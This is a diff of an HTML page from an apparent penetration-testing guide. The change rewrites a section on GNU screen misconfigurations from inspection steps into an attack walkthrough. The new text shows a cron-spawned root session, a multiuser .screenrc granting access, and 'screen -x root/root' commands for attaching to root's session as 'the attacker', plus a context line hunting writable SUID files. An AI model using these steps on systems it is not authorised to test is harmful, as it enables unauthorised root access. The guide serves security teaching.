@@ -10020,150 +10020,75 @@ find / -perm -u=s -writable -type f 2&gt;/dev/null
 find /etc/cron* /var/spool/cron/ -perm -u=s -type f 2&gt;/dev/null
 </code></pre>
 
-<h4 id="8164-screen-configuration-misconfigurations">8.16.4 Screen Configuration Misconfigurations</h4>
+<h4 id="8164-screen-misconfiguration">8.16.4 Screen Misconfiguration</h4>
 <p>
-In general, users cannot access or attach to other users’ screen sessions. However, certain system
-configurations may unintentionally allow privilege-sharing behaviors. These cases typically involve 
-automated execution (such as cron), multiuser settings, and binaries started with special permissions. 
-Understanding how these configurations work provides valuable insight when analyzing a system for 
-privilege-escalation weaknesses.
+Under normal circumstances, users cannot access another user’s <code>screen</code> sessions. 
+However, misconfigurations involving cron jobs, multiuser mode, and permission settings may 
+allow a lower-privileged user to attach to a privileged screen session (such as root).
 </p>
 
-<h5 id="81641-how-screen-gets-invoked">8.16.4.1 How Screen Gets Invoked</h5>
+<strong>Automatic Root Screen Session</strong>
 <p>
-A common pattern in misconfigured systems is screen being started automatically by a scheduled job. 
-For example, a cron task may create a privileged screen session whenever no session exists:
+A cron job may recreate a detached root session whenever its socket folder is empty:
+</p>
+<pre><code class="language-bash">find /var/run/screen/S-root/ -empty -exec screen -dmS root \;</code></pre>
+<p>
+Screen sessions are stored under:
+</p>
+<pre><code class="language-bash">/var/run/screen/S-root/&lt;session_id&gt;.root</code></pre>
+
+<strong>Multiuser Mode Enabled</strong>
+<p>
+Root’s <code>.screenrc</code> may enable multiuser access and explicitly grant another user permission:
+</p>
+<pre><code class="language-bash">multiuser on
+acladd user
+shell -/bin/bash</code></pre>
+<p>
+This makes root’s screen session attachable by the specified user.
 </p>
 
-<pre><code class="language-bash"># Inspect cron tasks that may start screen sessions
-grep -R "screen" /etc/cron* 2>/dev/null
-
-# Check if root is launching screen automatically
-ps aux | grep screen
-</code></pre>
-
+<strong>Listing Available Root Sessions</strong>
 <p>
-When screen starts, it typically creates socket directories under:
+Use <code>screen -ls</code> but point directly to the root directory:
 </p>
-
-<pre><code class="language-bash">/var/run/screen/S-[username]/
-</code></pre>
-
+<pre><code class="language-bash">screen -ls root/</code></pre>
 <p>
-The presence of such directories indicates active or recently created screen sessions owned by the user associated with them.
+Example output:
 </p>
+<pre><code class="language-bash">947.root (Multi, detached)
+1 Socket in /run/screen/S-root</code></pre>
 
-<h5 id="81642-identifying-screen-session-directories">8.16.4.2 Identifying Screen Session Directories</h5>
+<strong>Two Ways to Connect to a Session</strong>
 <p>
-Each screen session creates an entry inside its corresponding socket directory. 
-Identifying these directories helps understand what user owns which sessions.
+Screen allows attaching using either:
 </p>
-
-<pre><code class="language-bash"># List screen socket directories
-ls -l /var/run/screen/
-
-# Check root's session directory
-ls -l /var/run/screen/S-root/
-</code></pre>
-
-<p>
-If screen is continuously launched by automated tasks, the socket folder may be recreated 
-whenever it becomes empty.
-</p>
-
-<h5 id="81643-checking-screen-launch-arguments">8.16.4.3 Checking Screen Launch Arguments</h5>
-<p>
-Screen may be started with flags such as <code>-D -m</code> (detached mode) or <code>-S</code> (naming the session):
-</p>
-
-<pre><code class="language-bash"># Check active screen processes and their parameters
-ps aux | grep "[s]creen"
-</code></pre>
-
 <ul>
-  <li><strong>-D -m:</strong> Starts screen detached, useful for automated jobs.</li>
-  <li><strong>-S &lt;name&gt;:</strong> Names the session, often visible inside its socket directory.</li>
+  <li><strong>root/&lt;session_id&gt;</strong></li>
+  <li><strong>root/&lt;session_name&gt;</strong></li>
 </ul>
 
-<h5 id="81644-inspecting-multiuser-settings">8.16.4.4 Inspecting Multiuser Settings</h5>
+<strong>1. Connect using Session ID</strong>
+<pre><code class="language-bash">screen -x root/&lt;session_id&gt;</code></pre>
+
+<strong>2. Connect using Session Name</strong>
 <p>
-Screen supports multiuser mode when explicitly enabled. If this is configured, users may be added to 
-an access control list, which could allow interaction between different users' sessions.
+If the session is named “root”, you can attach using:
 </p>
+<pre><code class="language-bash">screen -x root/root</code></pre>
 
-<pre><code class="language-bash"># Inspect user-specific screen configuration
-cat ~/.screenrc 2>/dev/null
-
-# Inspect global screen configuration
-cat /etc/screenrc 2>/dev/null
+<strong>Terminal Type Fix (If Required)</strong>
+<p>
+If screen complains about a missing or invalid terminal type:
+</p>
+<pre><code class="language-bash">
+TERM=screen
+screen -x root/&lt;session_id_or_name&gt;
 </code></pre>
 
 <p>
-Directives such as:
+If misconfigured, this will drop the attacker directly into the running root session.
 </p>
-
-<pre><code class="language-bash">multiuser on
-acladd &lt;username&gt;
-</code></pre>
-
-<p>
-indicate that screen has been configured to permit controlled multiuser access.
-</p>
-
-<h5 id="81645-checking-permissions-and-binary-flags">8.16.4.5 Checking Permissions and Binary Flags</h5>
-<p>
-Some distributions may ship the screen binary with elevated permission bits (such as SUID). 
-This can affect how screen handles session ownership or access.
-</p>
-
-<pre><code class="language-bash"># Check screen binary permissions
-ls -l /usr/bin/screen
-
-# Check for special POSIX capabilities
-getcap /usr/bin/screen 2>/dev/null
-</code></pre>
-
-<p>
-Any presence of SUID or unusual capabilities should be documented, as it may influence 
-how screen sessions operate across user boundaries.
-</p>
-
-<h5 id="81646-identifying-available-screen-sessions">8.16.4.6 Identifying Available Screen Sessions</h5>
-<p>
-Screen will normally display only sessions owned by the current user. However, administrators or automated 
-tasks may create sessions under different accounts.
-</p>
-
-<pre><code class="language-bash"># List sessions owned by the current user
-screen -ls
-
-# Manually inspect session directories for other users
-ls -l /run/screen/
-</code></pre>
-
-<p>
-Some systems may organize screen sockets in subdirectories by username (e.g., <code>S-root/</code>). 
-Reviewing these directories can reveal how sessions are structured and whether they interact with automated tasks.
-</p>
-
-<h5 id="81647-environment-variables-and-terminal-behavior">8.16.4.7 Environment Variables and Terminal Behavior</h5>
-<p>
-Screen and similar terminal multiplexers rely on environment variables such as <code>TERM</code> to determine 
-terminal type. Missing or mismatched values may prevent interactions with sessions.
-</p>
-
-<pre><code class="language-bash"># Check terminal type
-echo $TERM
-
-# Reset terminal type if needed
-export TERM=xterm
-</code></pre>
-
-<p>
-Understanding how terminal variables influence session behavior is important when diagnosing access issues 
-or analyzing session configurations.
-</p>
-
 
 
 
